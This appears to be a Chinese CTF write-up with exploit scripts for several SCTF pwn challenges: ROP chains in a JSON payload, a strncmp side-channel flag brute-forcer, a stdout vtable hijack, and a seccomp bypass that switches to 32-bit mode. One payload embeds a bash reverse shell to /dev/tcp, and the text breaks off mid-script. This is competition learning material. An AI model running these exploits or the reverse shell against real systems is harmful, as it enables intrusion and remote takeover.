<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    &quot;bb&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;aa&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;cc&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;dd&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;ee&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;ff&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;gg&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;ff&quot;:&quot;aaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &quot;ee&quot;:&quot;aaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;dd&quot;:&quot;aaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;zz&quot;:&quot;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\&quot;bbbbbb\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u3100\u0000\u0000\u0000\u404e\ucfa6\uae7f\u0000&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;address&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;rop&quot;:&quot;\u0000\u0000\u0000\u0000\ua0eb\ub007\u4056\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u98ec\ub007\u4056\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/touch\u2020/ctf/work/asddd&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;rops&quot;:&quot;aaaaaaaa\u804e\ucfa6\uae7f\u0000\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u50f0\uc5a6\uae7f\u0000\u804e\ucfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u784f\ucfa6\uae7f\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/bash\u2020-c\u2020\u2022/bin/bash\u2020-i\u2020&gt;&amp;/dev/tcp/xxx.xxx.xxx.xx/9090\u20200&gt;&amp;1\u2022&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;rops&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="christmas-song">Christmas Song</span><a href="#christmas-song" class="header-anchor"></a></h3><p>逆向scan.l 和 parser.y文件得到slang语言语法文法</p>
<p>通过call function open flag read flag 然后利用strncmp侧信道爆破flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = remote(&#x27;124.71.144.133&#x27;, 2144)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift work is &quot;12345678901234567890123456789012345678901234567890&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift path is &quot;/home/ctf/flag&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift oflag is 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift temp is 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift Size is 48;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift fd is 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift flag is &quot;&#123;0&#125;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift Ans is 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift zero is 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift flagsize is &#123;1&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">reindeer Dancer delivering gift path oflag temp brings back gift fd;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">reindeer Dasher delivering gift fd work Size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">reindeer Prancer delivering gift work flag flagsize brings back gift Ans;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">this family wants gift Ans if the gift is Ans equal to zero : reindeer Rudolph delivering gift path oflag temp brings back gift fd; ok, they should already have a gift;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;SCTF&#123;Merry&#x27;</span></span><br><span class="line"></span><br><span class="line">cnt  = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">stringset = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> stringset:</span><br><span class="line"></span><br><span class="line">        temp = flag + i</span><br><span class="line"></span><br><span class="line">        log.success(temp)</span><br><span class="line"></span><br><span class="line">        sh = remote(<span class="string">&#x27;124.71.144.133&#x27;</span>, <span class="number">2144</span>)</span><br><span class="line"></span><br><span class="line">        sh.sendafter(<span class="string">&#x27;(EOF to finish):&#x27;</span>, payload.<span class="built_in">format</span>(temp, cnt))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># log.success(payload.format(temp, cnt))</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;error:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line"></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            flag += i</span><br><span class="line"></span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&#x27;flag=&#x27;</span> + flag)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="christmas-bash">Christmas Bash</span><a href="#christmas-bash" class="header-anchor"></a></h3><p>在开始时候将sleep变量的值设置成了libc中sleep可以用此求出libcbase</p>
<p>然后将_IO_2_1_stdout_的vtable中的_IO_file_jumps改为system, 利用printf即可触发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> gift libcbase is sleep - 972880;</span><br><span class="line"></span><br><span class="line">gift target is libcbase + 2205080;</span><br><span class="line"></span><br><span class="line">gift system is libcbase + 346848;</span><br><span class="line"></span><br><span class="line">gift Stdout is libcbase + 2201440 + 4;</span><br><span class="line"></span><br><span class="line">gift heap is libcbase + 2198720;</span><br><span class="line"></span><br><span class="line">gift var is &quot;12345678&quot;;</span><br><span class="line"></span><br><span class="line">gift Binsh is &quot;;/home/ctf/getflag &gt;&amp;2&quot;;</span><br><span class="line"></span><br><span class="line">gift Size is 8;</span><br><span class="line"></span><br><span class="line">gift tmp is 30;</span><br><span class="line"></span><br><span class="line">gift filename is &quot;wood&quot;;</span><br><span class="line"></span><br><span class="line">gift offset is 1000;</span><br><span class="line"></span><br><span class="line">gift var is var + offset;</span><br><span class="line"></span><br><span class="line">reindeer Vixen delivering gift target var Size;</span><br><span class="line"></span><br><span class="line">reindeer Vixen delivering gift Stdout Binsh tmp;</span><br><span class="line"></span><br><span class="line">reindeer Dancer delivering gift filename Size Size; </span><br></pre></td></tr></table></figure>

<h3><span id="gadget">Gadget</span><a href="#gadget" class="header-anchor"></a></h3><p>题目给了一个简单的栈溢出，但是用 seccomp 限制了 syscall 只能有 (fstat)5 和 (read) 0。</p>
<p>于是问题变成了，如何才能打开 flag 文件。查询 syscall 之后发现，在 i386 架构下，syscall number 5 是 open。因此，我们可以通过切换到 32 位的方式来打开 flag，然后再切换回 64 位模式来读取 flag。</p>
<p>但是仍然还有问题，并没有一个 syscall 可以写 flag 到输出，于是我们只能设计一个方法让远程能够判断 flag 某一位是不是某一个字符。这个方法有很多，我这里选择的是，在 gadget 的最后放一个 read stdin 的操作，这样就能让 ROP 执行完之后卡住。但是在卡住之前，会尝试往一个邻近边界的地址 + 当前 flag 字符的位置写入内容，如果越界了就崩溃（这样程序结束之后也就不会卡住了），如果没有越界就不会崩溃。通过这样的方式就可以判断。</p>
<p>由于 read 函数每次只能读入不到 200 个字符，最后我把 ROP 分成了四个阶段，具体 exploit 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;./gadget.patched&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.getenv(<span class="string">&#x27;TARGET&#x27;</span>):</span><br><span class="line"></span><br><span class="line">    ary = os.getenv(<span class="string">&#x27;TARGET&#x27;</span>).split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    target = (ary[<span class="number">0</span>], <span class="built_in">int</span>(ary[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">index, guess</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;testing %d, guess = %#x&#x27;</span> % (index, guess))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;target = %r&#x27;</span> % (target, ))</span><br><span class="line"></span><br><span class="line">    io = zio(target, print_read=COLORED(REPR, <span class="string">&#x27;yellow&#x27;</span>), print_write=COLORED(REPR, <span class="string">&#x27;cyan&#x27;</span>), timeout=<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line"></span><br><span class="line">        io.gdb_hint(breakpoints=[</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 0x401205,     # before ret</span></span><br><span class="line"></span><br><span class="line">            <span class="number">0x401222</span>,     <span class="comment"># before main ret</span></span><br><span class="line"></span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># do proof of work?</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># io.readline()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input(&#x27;continue?&#x27;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    flag_addr = <span class="number">0x40d160</span></span><br><span class="line"></span><br><span class="line">    flag_path = <span class="string">b&#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line">    new_stack2 = <span class="number">0x40D200</span></span><br><span class="line"></span><br><span class="line">    new_stack3 = <span class="number">0x40d400</span></span><br><span class="line"></span><br><span class="line">    new_stack4 = <span class="number">0x40d600</span></span><br><span class="line"></span><br><span class="line">    pop_rax_ret = <span class="number">0x401001</span>      <span class="comment"># pop rax/eax ; ret</span></span><br><span class="line"></span><br><span class="line">    syscall_pop_ret = <span class="number">0x401165</span>  <span class="comment"># syscall ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">    pop_rdi_pop_ret = <span class="number">0x401734</span>  <span class="comment"># pop rdi ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    pop_r14_pop2_ret = <span class="number">0x0000000000401731</span> <span class="comment"># pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    pop_rsi_pop2_ret = <span class="number">0x0000000000401732</span> <span class="comment"># pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    pop_rbx_pop3_ret = <span class="number">0x403072</span> <span class="comment"># pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret | pop ebx ; inc ecx ; pop esi ; inc ecx ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">    store_rdi_rax_ret = <span class="number">0x0000000000403beb</span> <span class="comment">#  mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret</span></span><br><span class="line"></span><br><span class="line">    access_rcx = <span class="number">0x0000000000402fee</span> <span class="comment"># mov byte ptr [rcx + rdi - 5], 0x89 ; ret</span></span><br><span class="line"></span><br><span class="line">    pop_rcx_ret = <span class="number">0x000000000040117b</span>    <span class="comment"># pop rcx ; ret</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;_&#x27;</span> * <span class="number">0x30</span> + <span class="string">b&#x27;_____RBP&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += l64(pop_rax_ret)</span><br><span class="line"></span><br><span class="line">    payload += flag_path.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload += l64(pop_rdi_pop_ret)</span><br><span class="line"></span><br><span class="line">    payload += l64(flag_addr + <span class="number">0x27</span>)</span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>) <span class="comment"># fill rbp</span></span><br><span class="line"></span><br><span class="line">    payload += l64(store_rdi_rax_ret)</span><br><span class="line"></span><br><span class="line">    payload += l64(pop_rdi_pop_ret)            </span><br><span class="line"></span><br><span class="line">    payload += l64(new_stack2)            <span class="comment"># bss</span></span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)  <span class="comment"># fill rbp</span></span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x401170</span>)            <span class="comment"># read stage2 ROP</span></span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x401730</span>)            <span class="comment"># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    payload += l64(new_stack2)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;_&#x27;</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x401222</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x4011ed</span>)    <span class="comment"># retf</span></span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x401222</span> | (<span class="number">0x23</span> &lt;&lt; <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># mode switched</span></span><br><span class="line"></span><br><span class="line">    payload2 += l32(pop_rax_ret)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x5</span>)        <span class="comment"># open</span></span><br><span class="line"></span><br><span class="line">    payload2 += l32(pop_rbx_pop3_ret)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(flag_addr)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(pop_rcx_ret)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    int80_ret = <span class="number">0x4011f3</span></span><br><span class="line"></span><br><span class="line">    payload2 += l32(int80_ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># switch back</span></span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x4011ed</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x401222</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l32(<span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">    payload2 += l64(pop_rdi_pop_ret)            </span><br><span class="line"></span><br><span class="line">    payload2 += l64(new_stack3)          <span class="comment"># bss</span></span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)  <span class="comment"># fill rbp</span></span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x401170</span>)            <span class="comment"># read stage3 ROP</span></span><br><span class="line"></span><br><span class="line">    payload2 += l64(<span class="number">0x401730</span>)            <span class="comment"># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    payload2 += 